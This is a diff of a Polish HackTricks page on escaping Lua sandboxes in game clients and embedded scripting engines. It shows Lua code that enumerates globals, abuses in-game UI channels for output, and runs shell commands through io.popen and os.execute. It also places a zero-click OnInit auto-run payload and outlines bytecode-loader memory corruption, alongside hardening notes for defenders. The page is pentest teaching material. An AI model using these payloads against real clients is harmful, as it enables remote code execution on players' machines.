@@ -1,14 +1,16 @@
-# Ominięcie Lua sandboxes (embedded VMs, game clients)
+# Bypass Lua sandboxes (embedded VMs, game clients)
 
-Ta strona zawiera praktyczne techniki służące do enumeracji i wydostawania się z Lua „sandboxów” osadzonych w aplikacjach (zwłaszcza game clients, plugins lub in-app scripting engines). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia dostęp do potężnych globali, które umożliwiają wykonanie dowolnych poleceń, a nawet natywne uszkodzenie pamięci, gdy udostępnione są bytecode loaders.
+{{#include ../../../banners/hacktricks-training.md}}
+
+Ta strona zawiera praktyczne techniki enumeracji i escape z „sandboxów” Lua osadzonych w aplikacjach (zwłaszcza klientach gier, pluginach lub silnikach skryptowych w aplikacjach). Wiele silników udostępnia ograniczone środowisko Lua, ale pozostawia dostęp do potężnych globali, które umożliwiają wykonanie dowolnych poleceń, a nawet natywne uszkodzenie pamięci, gdy dostępne są loadery bytecode.
 
 Najważniejsze idee:
-- Traktuj VM jak nieznane środowisko: enumeruj _G i sprawdzaj, do których niebezpiecznych prymitywów można uzyskać dostęp.
-- Gdy stdout/print jest zablokowane, wykorzystaj dowolny kanał UI/IPC dostępny w VM jako sink wyjścia, aby obserwować wyniki.
-- Jeśli io/os są udostępnione, często uzyskujesz bezpośrednie wykonywanie poleceń (io.popen, os.execute).
-- Jeśli udostępnione są load/loadstring/loadfile, wykonywanie spreparowanego Lua bytecode może w niektórych wersjach podważyć bezpieczeństwo pamięci (weryfikatory ≤5.1 można obejść; w 5.2 weryfikator usunięto), umożliwiając zaawansowaną eksploatację.
+- Traktuj VM jako nieznane środowisko: przeprowadź enumerację _G i sprawdź, do których niebezpiecznych prymitywów można uzyskać dostęp.
+- Gdy stdout/print jest zablokowane, wykorzystaj dowolny kanał UI/IPC w VM jako sink wyjścia, aby obserwować wyniki.
+- Jeśli io/os jest dostępne, często otrzymujesz bezpośrednie wykonanie poleceń (io.popen, os.execute).
+- Jeśli load/loadstring/loadfile są dostępne, wykonywanie spreparowanego Lua bytecode może w niektórych wersjach naruszyć bezpieczeństwo pamięci (weryfikatory ≤5.1 można obejść; w 5.2 weryfikator usunięto), umożliwiając zaawansowany exploitation.
 
-## Enumeracja sandboxed environment
+## Enumerate the sandboxed environment
 
 - Zrzuć globalne środowisko, aby zinwentaryzować dostępne tabele/funkcje:
 ```lua
@@ -20,7 +22,7 @@ out(tostring(k) .. " = " .. tostring(v))
 end
 end
 ```
-- Jeśli print() nie jest dostępne, wykorzystaj ponownie kanały dostępne w VM. Przykład z VM skryptu systemu mieszkań w MMO, gdzie wyjście czatu działa dopiero po wywołaniu dźwięku; poniższy kod tworzy niezawodną funkcję wyjścia:<sup>[[1]](#references)</sup>
+- Jeśli print() nie jest dostępne, wykorzystaj ponownie kanały in-VM. Przykład z VM skryptu systemu mieszkań w MMO, gdzie wyjście czatu działa dopiero po wywołaniu dźwięku; poniższy kod tworzy niezawodną funkcję wyjścia:<sup>[[1]](#references)</sup>
 ```lua
 -- Build an output channel using in-game primitives
 local function ButlerOut(label)
@@ -37,11 +39,11 @@ local out = ButlerOut(1)
 dump_globals(out)
 end
 ```
-Uogólnij ten wzorzec dla swojego celu: dowolne pole tekstowe, toast, logger lub callback UI, który akceptuje ciągi znaków, może służyć jako stdout podczas rekonesansu.
+Uogólnij ten wzorzec dla swojego celu: dowolne pole tekstowe, toast, logger lub callback UI, który akceptuje ciągi znaków, może służyć jako stdout do rekonesansu.
 
-## Bezpośrednie wykonywanie poleceń, jeśli io/os jest udostępnione
+## Bezpośrednie wykonywanie poleceń, jeśli io/os są dostępne
 
-Jeśli sandbox nadal udostępnia standardowe biblioteki io lub os, prawdopodobnie masz natychmiastowe wykonywanie poleceń:
+Jeśli sandbox nadal udostępnia standardowe biblioteki io lub os, prawdopodobnie masz natychmiastową możliwość wykonywania poleceń:
 ```lua
 -- Windows example
 io.popen("calc.exe")
@@ -50,24 +52,24 @@ io.popen("calc.exe")
 os.execute("/usr/bin/id")
 io.popen("/bin/sh -c 'id'")
 ```
-Uwagi:
+Notatki:
 
-- Wykonanie odbywa się wewnątrz procesu klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie zapobiegnie tworzeniu procesów w VM.
-- Sprawdź również: package.loadlib (ładowanie dowolnych bibliotek DLL/.so), require z native modules, ffi w LuaJIT (jeśli jest dostępne) oraz bibliotekę debug (może podnosić uprawnienia wewnątrz VM).
+- Wykonanie odbywa się wewnątrz procesu klienta; wiele warstw anti-cheat/antidebug, które blokują zewnętrzne debugery, nie zapobiegnie tworzeniu procesu w VM.
+- Sprawdź również: package.loadlib (ładowanie dowolnych bibliotek DLL/.so), require z native modules, ffi LuaJIT (jeśli jest dostępne) oraz bibliotekę debug (może podnosić uprawnienia wewnątrz VM).
 
-## Wyzwalacze zero-click za pośrednictwem callbacków auto-run
+## Zero-click triggers przez auto-run callbacks
 
-Jeśli aplikacja hosta przesyła skrypty do klientów, a VM udostępnia hooki auto-run (np. OnInit/OnLoad/OnEnter), umieść tam payload, aby przeprowadzić drive-by compromise natychmiast po załadowaniu skryptu:<sup>[[1]](#references)</sup>
+Jeśli aplikacja hosta wysyła skrypty do klientów, a VM udostępnia auto-run hooks (np. OnInit/OnLoad/OnEnter), umieść tam swój payload, aby przeprowadzić drive-by compromise natychmiast po załadowaniu skryptu:<sup>[[1]](#references)</sup>
 ```lua
 function OnInit()
 io.popen("calc.exe") -- or any command
 end
 ```
-Każdy równoważny callback (OnLoad, OnEnter itd.) uogólnia tę technikę, gdy skrypty są automatycznie przesyłane do klienta i wykonywane.
+Każdy równoważny callback (OnLoad, OnEnter itd.) uogólnia tę technikę, gdy skrypty są automatycznie przesyłane i wykonywane po stronie klienta.
 
-## Niebezpieczne primitives do wyszukania podczas recon
+## Niebezpieczne prymitywy do wyszukania podczas recon
 
-Podczas enumeracji _G zwróć szczególną uwagę na:
+Podczas wyliczania elementów `_G` zwróć szczególną uwagę na:
 - io, os: io.popen, os.execute, file I/O, dostęp do env.
 - load, loadstring, loadfile, dofile: wykonywanie source lub bytecode; obsługa ładowania niezaufanego bytecode.
 - package, package.loadlib, require: dynamiczne ładowanie bibliotek i powierzchnia modułów.
@@ -76,7 +78,7 @@ Podczas enumeracji _G zwróć szczególną uwagę na:
 
 Minimalne przykłady użycia (jeśli są dostępne):
 
-API loadera Lua zmieniło się między wersjami: w Lua 5.1 `load` odczytuje dane z funkcji reader, a `loadstring` odczytuje je z łańcucha znaków; `load` w Lua 5.2 akceptuje zarówno łańcuch znaków, jak i funkcję reader, a `loadstring` jest przestarzałym odpowiednikiem.<sup>[[5]](#references)[[6]](#references)</sup>
+API loadera Lua zmieniało się między wersjami: w Lua 5.1 `load` odczytuje dane z funkcji reader, a `loadstring` odczytuje je z stringa; `load` w Lua 5.2 przyjmuje zarówno string, jak i funkcję reader, a `loadstring` jest przestarzałym odpowiednikiem.<sup>[[5]](#references)[[6]](#references)</sup>
 ```lua
 -- Lua 5.2+ source loader; Lua 5.1 use loadstring("return 1+1")
 local f = load("return 1+1")
@@ -91,27 +93,27 @@ print(g())
 local mylib = package.loadlib("./libfoo.so", "luaopen_foo")
 local foo = mylib()
 ```
-## Opcjonalna eskalacja: nadużywanie loaderów Lua bytecode
+## Opcjonalna eskalacja: wykorzystywanie loaderów Lua bytecode
 
-Gdy load/loadstring/loadfile są dostępne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do ujawnienia i uszkodzenia pamięci. Najważniejsze fakty:
-- Lua ≤ 5.1 zawierał wbudowany bytecode verifier, dla którego znane są obejścia.<sup>[[4]](#references)</sup>
-- Lua 5.2 całkowicie usunął verifier (oficjalne stanowisko: aplikacje powinny po prostu odrzucać precompiled chunks), co poszerza attack surface, jeśli ładowanie bytecode nie jest zabronione.<sup>[[2]](#references)[[3]](#references)</sup>
-- Typowy workflow obejmuje: leak pointerów za pomocą outputu w VM, spreparowanie bytecode w celu utworzenia type confusion (np. wokół FORLOOP lub innych opcode’ów), a następnie przejście do arbitrary read/write lub wykonania native code.<sup>[[2]](#references)[[4]](#references)</sup>
+Gdy load/loadstring/loadfile są dostępne, ale io/os są ograniczone, wykonanie spreparowanego Lua bytecode może prowadzić do ujawnienia pamięci i uzyskania prymitywów jej modyfikacji. Najważniejsze fakty:
+- Lua ≤ 5.1 zawierała bytecode verifier, który ma znane obejścia.<sup>[[4]](#references)</sup>
+- Lua 5.2 całkowicie usunęła verifier (oficjalne stanowisko: aplikacje powinny po prostu odrzucać precompiled chunks), co poszerza attack surface, jeśli ładowanie bytecode nie jest zablokowane.<sup>[[2]](#references)[[3]](#references)</sup>
+- Typowy przebieg obejmuje: wyciek pointerów za pośrednictwem danych wyjściowych w VM, spreparowanie bytecode w celu wywołania type confusion (np. wokół FORLOOP lub innych opcode'ów), a następnie przejście do arbitrary read/write lub native code execution.<sup>[[2]](#references)[[4]](#references)</sup>
 
-Ta ścieżka zależy od konkretnego engine/version i wymaga RE. Zobacz references, aby zapoznać się ze szczegółowymi analizami, exploitation primitives i przykładami gadgetów w grach.
+Ta ścieżka zależy od engine/version i wymaga RE. Zobacz referencje, aby zapoznać się z dogłębnymi analizami, exploitation primitives oraz przykładami gadgetów w grach.
 
 ## Uwagi dotyczące wykrywania i hardeningu (dla defenderów)
 
-- Po stronie serwera: odrzucaj lub przepisuj user scripts; stosuj allowlist bezpiecznych API; usuń albo powiąż z pustymi implementacjami io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi.
-- Po stronie klienta: uruchamiaj Lua z minimalnym _ENV, zabroń ładowania bytecode, ponownie wprowadź rygorystyczny bytecode verifier lub signature checks oraz zablokuj tworzenie procesów z procesu klienta.
-- Telemetria: generuj alerty dotyczące tworzenia gameclient → child process krótko po załadowaniu skryptu; koreluj je ze zdarzeniami UI/chat/script.
+- Po stronie serwera: odrzucaj lub przepisuj user scripts; stosuj allowlistę bezpiecznych API; usuwaj io, os, load/loadstring/loadfile/dofile, package.loadlib, debug, ffi albo wiąż je z pustymi wartościami.
+- Po stronie klienta: uruchamiaj Lua z minimalnym _ENV, zabroń ładowania bytecode, ponownie wprowadź ścisły bytecode verifier lub signature checks i zablokuj tworzenie procesów z procesu klienta.
+- Telemetria: generuj alerty dotyczące tworzenia child process przez gameclient wkrótce po załadowaniu scriptu; koreluj je ze zdarzeniami UI/chat/script.
 
 ## References
 
-- [1] [Ten dom jest nawiedzony: RCE sprzed dekady w kliencie AION (z housing Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
-- [2] [Analiza bytecode: rozwiązywanie problemów bezpieczeństwa Lua w Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
-- [3] [lua-l (2009): Dyskusja na temat usunięcia bytecode verifiera](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
-- [4] [Exploiting Lua 5.1 bytecode (gist z obejściami i uwagami dotyczącymi verifiera)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
-- [5] [Podręcznik referencyjny Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
-- [6] [Podręcznik referencyjny Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
+- [1] [Ten dom jest nawiedzony: RCE sprzed dekady w kliencie AION (zawierającym Lua VM)](https://appsec.space/posts/aion-housing-exploit/)
+- [2] [Analiza bytecode: odkrywanie luk bezpieczeństwa Lua w Factorio](https://memorycorruption.net/posts/rce-lua-factorio/)
+- [3] [lua-l (2009): Dyskusja na temat usunięcia bytecode verifier](https://web.archive.org/web/20230308193701/https://lua-users.org/lists/lua-l/2009-03/msg00039.html)
+- [4] [Exploiting Lua 5.1 bytecode (gist z obejściami verifiera/notatkami)](https://gist.github.com/ulidtko/51b8671260db79da64d193e41d7e7d16)
+- [5] [Dokumentacja referencyjna Lua 5.1](https://www.lua.org/manual/5.1/manual.html#pdf-loadstring)
+- [6] [Dokumentacja referencyjna Lua 5.2](https://www.lua.org/manual/5.2/manual.html#pdf-load)
 {{#include ../../../banners/hacktricks-training.md}}
